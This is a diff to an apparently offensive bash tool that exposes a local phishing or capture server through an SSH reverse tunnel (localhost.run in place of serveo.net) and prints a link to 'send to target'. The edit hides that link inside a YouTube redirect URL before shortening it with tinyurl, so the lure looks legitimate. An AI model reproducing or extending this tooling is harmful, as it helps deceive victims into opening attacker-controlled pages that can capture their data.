@@ -388,13 +388,16 @@ command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not instal
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
+#$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -R 80:localhost:'$port' ssh.localhost.run 2> /dev/null > sendlink ' &
 printf "\n"
 sleep 10 # &
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+#send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+send_link=$(grep -o "https://[0-9a-z]*\.localhost.run" sendlink)
 printf "\n"
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
-send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
+send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$send_link" | head -n1)
+#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
 printf "\n"
 checkfound
@@ -493,7 +496,7 @@ fi
 
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunelling, Best!)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m localhost.run (SSH Tunelling, Best!)\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
